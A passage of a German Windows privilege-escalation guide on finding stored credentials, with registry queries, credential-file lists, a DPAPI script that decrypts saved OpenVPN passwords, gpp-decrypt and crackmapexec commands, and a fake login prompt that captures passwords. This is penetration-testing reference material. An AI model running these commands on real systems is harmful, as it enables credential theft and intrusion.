Ein CI-Server kann eingereichte Quellcodeänderungen auch nach Abschluss des Builds in seinem Datenverzeichnis aufbewahren. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Änderungen aus Remote-Runs; das Datenverzeichnis lässt sich konfigurieren und befindet sich nicht zwingend unter `ProgramData`. Ein lesbarer Patch kann entfernte oder hinzugefügte Verweise auf eine Zugangsdaten-Datei, einen Verschlüsselungsschlüssel oder ein Skript enthalten, das beides verwendet. Ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` benötigt beispielsweise neben der verschlüsselten Zeichenfolge auch den AES-Schlüssel; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat übergeben wird. Prüfen Sie zunächst nur zugängliche Patchnamen und untersuchen Sie anschließend relevante Inhalte mit entsprechender Autorisierung, ohne Geheimnisse in routinemäßigen Enumerationsausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Zugangsdaten noch Zugriff mit höheren Berechtigungen. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen einzubringen.

### Benutzerdefinierte Rotation lokaler Administratorkennwörter

Ein selbst entwickeltes Kennwort-Rotationstool speichert möglicherweise ein verschlüsseltes lokales Administratorkennwort in einem lokalen Dienst, während dessen Datenspeicher-Zugangsdaten in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei liegen. Prüfen Sie gemeinsam die geplante Aufgabe des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen für den Datenspeicher. Ein nur an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Zugangsdaten dennoch erreichbar; die Authentifizierung allein belegt jedoch nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Sind Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich, prüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go [`math/rand`](https://pkg.go.dev/math/rand) ableitet, eignet sich nicht zum Schutz dieses Kennworts; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallswerte ungeeignet ist. Vergewissern Sie sich, dass jedes wiederhergestellte Kennwort aktuell ist und zu einem Konto der lokalen Administratorengruppe gehört, bevor Sie es als möglichen Privilegien-Eskalationspfad einstufen. Eine geplante Aufgabe, ein `.env`-Pfad oder ein verschlüsselter Blob allein belegt keine dieser Voraussetzungen. Nehmen Sie Passwörter und Schlüsselmaterial nicht in routinemäßige Enumerationsausgaben auf.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorkennwörter. Dessen Verzeichnis- oder Entra-gestützter Speicher und Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; ebenso legen [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) fest, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen darf.

### Java-Server-Plugin-Archive und Wiederverwendung von Zugangsdaten

Einige Java-Server-Plugins werden als JAR-Archive im `plugins`-Verzeichnis eines Servers bereitgestellt. Ein lesbares benutzerdefiniertes Plugin kann Konfigurationen oder Bytecode mit eingebetteten Dienst-Zugangsdaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Autorisierung und nehmen Sie wiederhergestellte Geheimnisse nicht in routinemäßige Enumerationsausgaben auf. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist; ein wiederhergestelltes Dienstpasswort führt nur dann zu höheren Berechtigungen, wenn es auch für ein privilegierteres Konto gültig ist. Prüfen Sie die ACLs der betreffenden Dateien und ersetzen Sie wiederverwendete Zugangsdaten durch separate Geheimnisse. Informationen zum Verzeichnisaufbau finden Sie in [PaperMCs Installationsanleitung für Plugins](https://docs.papermc.io/paper/adding-plugins/) und zu Archivinhalten in [Oracles JAR-Dokumentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Zugangsdaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Kann das aktuelle Konto die Datei lesen, prüfen Sie gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Laut Openfires [Dokumentation zum Benutzeranbieter](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter im Klartext oder verschlüsselt mit einem in dieser Eigenschaft gespeicherten Schlüssel abgelegt werden. Ein wiederhergestelltes Passwort ist für eine Privilegien-Eskalation nur relevant, wenn es für eine privilegiertere Identität noch gültig ist; der Dateiname allein belegt weder Lesezugriff noch die Wiederverwendung der Zugangsdaten. Der Pfad dient als Hinweis für die Bestandsaufnahme. Geben Sie Datenbankinhalte und Zugangsdaten nicht in routinemäßigen Enumerationsausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Admin-Konsole offenlegen, auch wenn eine externe Datenbank verwendet wird. Openfire bindet seine Admin-Konsole häufig an Loopback; ein lokales Konto kann die Adresse dennoch erreichen, wenn der Listener aktiv ist. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Admin-Rolle, die Richtlinie für Plugin-Uploads und die Identität des Openfire-Dienstes. Ein Administrator, der ein Plugin installieren kann, kann Plugin-Code im Kontext des Dienstes ausführen lassen; dieser kann hoch privilegiert sein, wenn der Dienst als LocalSystem läuft. Ein übereinstimmendes Kontopasswort oder ein lesbarer Konfigurationspfad allein belegt weder Zugriff auf die Admin-Konsole noch Codeausführung. Siehe die [Installations- und Plugin-Verwaltungsanleitung des Herstellers](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, die üblicherweise `server.config.yaml` heißen, können `CA.private_key` der internen CA enthalten. Kann ein Benutzer mit niedrigeren Berechtigungen diesen Schlüssel lesen, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Material; ihr Fund belegt keinen Zugriff auf die Server-CA. In einigen Deployments wird der private CA-Schlüssel offline aufbewahrt, sodass eine lesbare Serverkonfiguration den Signaturschlüssel möglicherweise ebenfalls nicht enthält.

Prüfen Sie auf einem Windows-Server die ACLs der **Server**-Konfiguration im Installationsverzeichnis sowie geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; falls der konfigurierte Dienstpfad davon abweicht, verwenden Sie diesen. Vergewissern Sie sich, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Enumerationsausgaben aus. Der Workflow `config api_client` des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; dafür ist jedoch auch eine wirksame serverseitige Rolle erforderlich. Deren Erstellung oder Änderung kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann einen möglichen Zugriffspfad bieten, auch wenn solche Schreibzugriffe nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im jeweiligen Server- oder Agentenkontext, der hoch privilegiert sein kann.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signaturschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen sowie den Zugriff auf Listener. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungssicherungs-Backup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. Laut dem [Exportleitfaden von SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) sind Exporte passwortverschlüsselt und können Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten; das [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) nennt den nativen Speicherort. Prüfen Sie zuerst Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät weder das Passwort noch belegt es, dass gespeicherte Zugangsdaten noch gültig sind oder höhere Berechtigungen gewähren.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-Private-Keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Prüfe daher, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht läuft und du möchtest, dass er beim Booten automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH an einem Rechner anzumelden. Die Registry `HKCU\Software\OpenSSH\Agent\Keys` existiert nicht, und Procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows Imaging-Backupdateien (`.wim`) können auch Offline-Hives von `SAM`, `SECURITY` und `SYSTEM` enthalten. Priorisieren Sie lokal zugängliche Backup- oder Imageverzeichnisse und prüfen Sie die **Namen der enthaltenen Dateien** eines Images, bevor Sie etwas extrahieren; ein `.wim`-Dateiname allein beweist nicht, dass Hives zugänglich sind, und reguläre `install.wim`-, `boot.wim`- und Recovery-Images sind häufige Fehlalarme. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn diese Freigabe zum Geltungsbereich gehört. Siehe Microsofts [Anleitung zu Windows-Images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [Referenz zu Registry-Hive-Dateien](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Zugangsdaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Computern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten alle Domänenbenutzer auf die Group Policy Objects (GPOs) zugreifen, die als XML-Dateien in SYSVOL gespeichert waren. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien nach einem nicht leeren Feld „cpassword“ durchsucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und hilft so dabei, diese Sicherheitslücke zu identifizieren und zu beheben.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder unter _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec verwenden, um an die Passwörter zu gelangen:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS-Webkonfiguration

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem bereitgestellten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du es als Offenlegung einstufst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Pfad. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Der Name eines Archivs beweist weder, dass es ein Geheimnis enthält, noch, dass wiederhergestellte Zugangsdaten höhere Berechtigungen gewähren.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den **Benutzer jederzeit auffordern, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu **fragen**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen, die Zugangsdaten enthalten**

Bekannte Dateien, die irgendwann einmal **Passwörter** im **Klartext** oder als **Base64** enthielten

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-Datenbanken verwenden häufig die Dateiendung `.psafe3`. Betrachte eine Datei mit passendem Namen als möglichen verschlüsselten Tresor; ihre Existenz bedeutet nicht, dass du sie lesen, entsperren oder darin gespeicherte Zugangsdaten verwenden kannst. Prüfe zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse, um festzustellen, wo solche Dateien gespeichert sind.

Eine lesbare KeePass-Datei `.kdbx` ist ebenfalls nur ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren sind das tatsächliche Master-Passwort sowie alle konfigurierten Schlüsseldateien oder Kontofaktoren erforderlich. Wenn bei einer autorisierten Prüfung ein LM:NT-Hash-Paar in einem Eintrag gefunden wird, überprüfe das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag gewährt für sich genommen keine Administrator- oder SYSTEM-Rechte auf dem Ziel; auch der Remote-Dienstzugriff, die Kontoberechtigungen und alle separaten Schritte zur Dienstausführung müssen gegeben sein. Die Bestandsaufnahme sollte den Pfad und die Lesbarkeit des Tresors erfassen, nicht die Datenbank oder die gespeicherten Zugangsdaten ausgeben.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Prüfe zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Datensatz und die gelöschte Datei als zugehörigen `$R`-Eintrag. Prüfe die Metadaten und den Lesezugriff der aktuellen Identität, bevor du ein Archiv öffnest. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachte einen Archivnamen als Kandidaten für eine Prüfung, nicht als Beweis dafür, dass das Archiv ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf Codesignierung sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser ein geändertes PowerShell-Skript signieren; [PowerShell erfordert für die Codesignierung ein Zertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Herausgeberregeln prüfen die Identität des Signierers und den Geltungsbereich der Regel](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Für eine kontenübergreifende Ausführung muss die aktuelle Identität das konkrete Skript ändern können, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptieren und eine geplante Aufgabe oder ein anderer Prozess mit höheren Berechtigungen das Skript tatsächlich ausführen. Ein `.pfx`-Dateiname, ein Zertifikatsbetreff oder ein beschreibbares Skript allein belegt diese Kette nicht. Prüfe Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor du auf Material mit privaten Schlüsseln zugreifst oder die Aufgabe auslöst.

Prüfe außerdem zugängliche Profildatenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, manchmal auch in einem benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Daten-Volume ermöglichen, das ältere Backups enthält. Prüfe das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, ist für die Offline-Wiederherstellung von Domänenzugangsdaten auch der passende `SYSTEM`-Hive erforderlich, wie im [Workflow zu Backups und privilegierten Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänenbackup vorhanden ist.

Um mit mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**OpenSSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter aus **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfen Sie auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Beim herkömmlichen **Default**-Profil von Edge des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Standardspeicherort des Profils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein einer Datei ist lediglich ein Hinweis auf einen möglichen Speicherort von Zugangsdaten: Stellen Sie fest, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem Konto mit höheren Berechtigungen gehört. Eine reine Pfadermittlung muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und Dateien mit verschlüsselten Logins sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfen Sie, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor Sie davon ausgehen, dass die Zugangsdaten verwendet werden können. Wenn ein wiederhergestellter Zugang zu einem Domänenkonto gehört, prüfen Sie separat die effektiven Gruppenverwaltungsrechte dieses Kontos und die [Lese- oder Entschlüsselungsrechte für LAPS-Passwörter](../active-directory-methodology/laps.md) der Gruppe; Browser-Artefakte allein belegen keinen Weg zu Administratorrechten.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine Technologie, die in das Windows-Betriebssystem integriert ist und die **Kommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird durch eine **class ID (CLSID)** identifiziert, und jede Komponente stellt Funktionen über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Innerhalb der CLSIDs dieser Registry finden Sie den untergeordneten Registry-Schlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (threadneutral) sein kann.

![Browserverlauf – COM DLL Overwriting: Innerhalb der CLSIDs dieser Registry finden Sie den untergeordneten Registry-Schlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Grundsätzlich können Sie **Berechtigungen erweitern**, wenn Sie **eine der ausgeführten DLLs überschreiben** können und diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus einsetzen, finden Sie hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

